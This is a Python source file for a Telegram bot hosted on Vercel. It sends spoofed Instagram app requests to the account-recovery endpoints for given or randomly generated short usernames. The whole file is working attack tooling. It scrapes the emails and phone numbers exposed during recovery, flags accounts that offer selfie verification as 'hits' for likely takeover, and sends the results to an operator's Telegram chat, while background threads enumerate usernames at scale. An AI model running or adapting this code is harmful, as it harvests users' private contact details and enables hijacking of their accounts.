import os
import json
import re
import uuid
import random
import string
import time
import threading
import requests
from http.server import BaseHTTPRequestHandler

# ====================== CONFIG FROM VERCEL ENV ======================
TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")  # https://your-project.vercel.app

if not TOKEN or not CHAT_ID:
    raise Exception("BOT_TOKEN and CHAT_ID environment variables are required!")

# Global stats
hads = bad = erore = 0
checked = set()
lock = threading.Lock()

def check_one(username):
    global hads, bad, erore
    username = username.strip().lstrip('@').lower()
    if not username or username in checked:
        return
    
    with lock:
        checked.add(username)

    try:
        sess = requests.Session()
        device_id = str(uuid.uuid4())

        headers = {
            'User-Agent': 'Instagram 390.0.0.43.81 Android (33/13; 480dpi; 1080x2316; HONOR; RMO-NX1; HNRMO-Q; qcom; ar_IQ; 766920165)',
            'accept-language': 'ar-IQ, en-US',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-ig-app-id': '567067343352427',
            'x-ig-device-id': device_id,
        }

        data = {
            'params': f'{{"client_input_params":{{"is_username_or_email":1,"search_query":"{username}"}},"server_params":{{"is_from_logged_out":0,"device_id":"{device_id}"}}}}',
            'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
            'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5',
        }

        res1 = sess.post(
            'https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.uhl.nav.async/',
            headers=headers, data=data, timeout=12
        )

        if res1.status_code == 200:
            match = re.search(r'Q-PTB[a-zA-Z0-9_\-]*\|aplrr', res1.text)
            if match:
                token = match.group(0)
                res2 = sess.post(
                    'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.ap.two_step_verification.challenge_picker/',
                    headers=headers,
                    data={'params': f'{{"server_params":{{"context_data":"{token}"}}}}', 
                          'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
                          'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5'},
                    timeout=12
                ).text

                if 'SELFIE' in res2.upper():
                    with lock:
                        global hads
                        hads += 1
                    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', res2)
                    phone = re.search(r'(\+\d{1,4}[\s\d\-\(\)]{8,})', res2)
                    msg = f"🎯 **Selfie Hit!**\n\n👤 @{username}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                json={"chat_id": CHAT_ID, "text": msg})
                else:
                    with lock:
                        global bad
                        bad += 1
            else:
                with lock: global bad; bad += 1
        else:
            with lock: global erore; erore += 1

    except Exception:
        with lock: global erore; erore += 1


class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)

            # Telegram update
            if 'message' in data:
                msg = data['message']
                text = msg.get('text', '')

                if text.startswith('/check '):
                    username = text.split()[1]
                    threading.Thread(target=check_one, args=(username,), daemon=True).start()
                    self.send_response(200)
                    self.end_headers()
                    return

                elif text.startswith('/start'):
                    for _ in range(15):  # Limited threads for Vercel
                        threading.Thread(target=random_check, daemon=True).start()

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ok')

        except:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ok')

    def do_GET(self):
        if self.path.startswith('/check?user='):
            user = self.path.split('=')[1]
            threading.Thread(target=check_one, args=(user,), daemon=True).start()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Checking...')
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Instagram Checker Bot is running')


def random_check():
    chars = "qwertyuioplkjhgfdsazxcvbnm1234567890._"
    while True:
        user = ''.join(random.choices(chars, k=random.randint(4, 6)))
        check_one(user)
        time.sleep(1.2)  # Be gentle


# Set webhook when function starts (only once)
if WEBHOOK_URL:
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={WEBHOOK_URL}")
    except:
        pass
